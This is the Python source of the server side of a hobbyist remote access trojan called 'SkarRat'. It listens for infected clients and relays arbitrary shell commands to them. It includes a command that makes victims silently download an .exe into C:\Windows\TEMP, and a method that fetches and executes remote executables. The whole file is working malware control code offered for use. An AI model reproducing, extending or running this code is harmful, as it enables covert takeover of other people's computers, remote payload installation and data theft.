import os
import socket
import subprocess
import requests
from threading import Thread
from colorama import Fore, Style, init
import random
import sys

# ANSI escape codes for text colors
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'

# ANSI escape codes for text background colors
BG_BLACK = '\033[40m'
BG_RED = '\033[41m'
BG_GREEN = '\033[42m'
BG_YELLOW = '\033[43m'
BG_BLUE = '\033[44m'
BG_MAGENTA = '\033[45m'
BG_CYAN = '\033[46m'
BG_WHITE = '\033[47m'

# Additional text formatting
BOLD = '\033[1m'  # Bold or increased intensity
UNDERLINE = '\033[4m'  # Underline
ITALIC = '\033[3m'  # Italic

RESET = '\033[0m'  # Reset color and formatting

init(autoreset=True)

randomNum = random.random() # define random num cus its usfull

class ControlCenter:
    def __init__(self, port):
        self.port = port
        self.clients = []

    def listen(self):
        os.system('cls') # clear after u input ur port to listen on
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('0.0.0.0', self.port))
        s.listen(5)
        print(Fore.MAGENTA + "\n [ ~ ] Control center is listening on port: ", self.port)

        while True:
            conn, addr = s.accept()
            client = RemoteClient(conn, addr)
            self.clients.append(client)
            thread = Thread(target=self.handle_client, args=(client,))
            thread.start()
        #    os.system('cls') #clear when u get a connecting to keep shit clean
            print(Fore.GREEN + "\n [ $ ] Client connected from", client.ip + ":" + str(client.port), "\n")

    def handle_client(self, client):
        while True:
            try:
                command = input(Fore.CYAN + f"\n [ ¢ ] root@{client.ip}:~$ ")

                # --------------------- PREDFINED COMMANDS ---------------------
                #  -- Im making veriables for commands so u can cusotom it idk --

                # - Im using skar as a prefix cus why not? -
                clearCommand = 'clear'
                helpCommand = 'skar help'
                downloadCommand = 'skar download'
                exploreCommand = 'skar explore'
                listenCommand = 'skar listen'
                exitCommand = 'skar exit'
                clientKillCommand = 'skar kill client'

                if not command:
                    print(Fore.YELLOW + "\n [ - ] Please enter a command or type 'clear' to clear the terminal.")
                    continue

                if command == clearCommand:
                    os.system('cls') 
                    continue

                elif command == helpCommand:
                    os.system('cls')
                    print(Fore.CYAN + "\n\n -- SkarRat -- Made By Skar --")
                    print(Fore.CYAN + "\n [ ¢ ] List Of InBuilt Commands ")
                    print(Fore.CYAN + "\n [ clear ] - Clear Terminal ")
                    print(Fore.CYAN + "\n [ skar help ] - List Of Commands ")
                    print(Fore.CYAN + "\n [ skar download <url>] - Download File" )
                    print(Fore.CYAN + "\n [ skar explore ] - Inbuilt File Explorer Commands " )
                    print(Fore.CYAN + "\n [ skar listen ] - Return To Port Selector ")
                    print(Fore.CYAN + "\n [ skar exit ] - Exit ")
                    print(Fore.CYAN + "\n [ skar kill client ] - Uninstall client ")
                    continue

                elif command.startswith('skar download '):
                    download_url = command[13:].strip()  # Extract the URL
                    downloadFull = f"curl --silent {download_url} --output C:\\Windows\\TEMP\\Download_{randomNum}.exe >nul 2>&1"
                    client.send_command(downloadFull)
                    print(Fore.GREEN + " [ + ] Successfully downloaded 'C:\\Windows\\TEMP'!\n\n") 
                    continue
                
                elif command == exploreCommand:
                    print(Fore.CYAN + "\n [ skar goto <path>] - Change dir. Path syntax example: //Windows//TEMP ")
                    print(Fore.CYAN + "\n [ del <file> ] - Delte file. Example syntax: del x.txt ")
                    print(Fore.CYAN + "\n [ dir ] - Dirrectory List ")  

                elif command == listenCommand:
                    main()

                elif command == exitCommand:
                    wannaexit = input(Fore.YELLOW + "\n [ ? ] Are you sure you want to exit? (y/n) ")
                    if wannaexit == 'y':
                        sys.exit(0)
                    elif wannaexit == 'n':
                        print(Fore.GREEN + "\n [ :) ] Oof! I got scared for a sec there... ")
                        continue
                    else:
                        print(Fore.YELLOW + "\n [ lol ] at least enter a valid command bozo it was a simple question!! ")
                        continue
                
                elif command == clientKillCommand:
                    wannaKillClient = input(Fore.RED + "\n [ ! ] Do you want to uninstall client? This can't be undone! (y/n) ")
                    if wannaKillClient == 'y':
                        uninstallClientCmd = 'sys.exit(0)'
                        client.send_command(uninstallClientCmd)
                        print(Fore.GREEN + " [ # ] Successfully uninstall client!\n\n") 
    
                        continue
                    elif wannaKillClient == 'n':
                        print(Fore.GREEN + "\n [ :) ] Oof! I got scared for a sec there... ")
                        continue
                    else:
                        print(Fore.YELLOW + "\n [ lol ] at least enter a valid command bozo it was a simple question!! ")
                        continue
                        






                else:   # execute commands that are sent 
                    client.send_command(command)
                    response = client.receive_output()
                    if response:
                        print(Fore.GREEN + f"\n [ * ] Output from {client.ip}:{client.port}:")
                        print(response)
                    else:
                        print(Fore.YELLOW + " [ - ] Command sent but no output found\n\n") # adding some space so u dont get eye cancer viewing ouput lol

            except ConnectionResetError: # if the client disconnects...
                os.system('cls') # cls again
                print(Fore.RED + f"\n [ ! ] {client.ip} has disconnected.")
                print(Fore.MAGENTA + f"\n [ ~ ] Listening for new connections...")
                self.clients.remove(client)
                break

    def change_directory(self, path):
        os.chdir(path)

class RemoteClient:
    def __init__(self, conn, addr):
        self.conn = conn
        self.ip, self.port = addr

    def send_command(self, command):
        self.conn.send(command.encode())

    def receive_output(self):
        data = self.conn.recv(1024).decode()
        return data

    def download_and_run(self, download_url):
        try:
            response = requests.get(download_url)
            if response.status_code == 200:
                file_content = response.content
                with open('C:\\Windows\\TEMP\\downloaded_file.exe', 'wb') as file:  # Save the file as "downloaded_file.exe"
                    file.write(file_content)

                try:
                    subprocess.Popen(['downloaded_file.exe'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    return "File downloaded and executed successfully."
                except Exception as e:
                    return f"Failed to execute the downloaded file: {str(e)}"
            else:
                return "Failed to download the file from the given URL."
        except Exception as e:
            return f"An error occurred: {str(e)}"

def main():
    os.system('cls')
    control_port = int(input(Fore.CYAN + "\n [ > ] Enter the control center's port to listen on: "))
    server = ControlCenter(control_port)
    server.listen()

if __name__ == "__main__":
    main()
